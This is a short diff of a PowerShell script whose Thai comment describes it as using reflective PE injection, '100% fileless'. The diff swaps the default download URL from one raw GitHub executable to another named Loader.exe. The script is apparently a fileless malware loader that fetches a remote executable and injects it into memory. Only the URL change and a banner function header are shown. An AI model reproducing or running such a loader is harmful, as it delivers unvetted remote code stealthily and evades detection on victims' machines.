@@ -2,7 +2,7 @@
 # ใช้ Reflective PE Injection - 100% Fileless
 
 param(
-    [string]$Url = "https://raw.githubusercontent.com/hendewkanokpuy-ai/ZynX/refs/heads/main/ZYNX_CRITICAL.exe"
+    [string]$Url = "https://raw.githubusercontent.com/kanokponjamsiri-pixel/LOADERRRRR/refs/heads/main/Loader.exe"
 )
 
 function Write-ColorBanner {
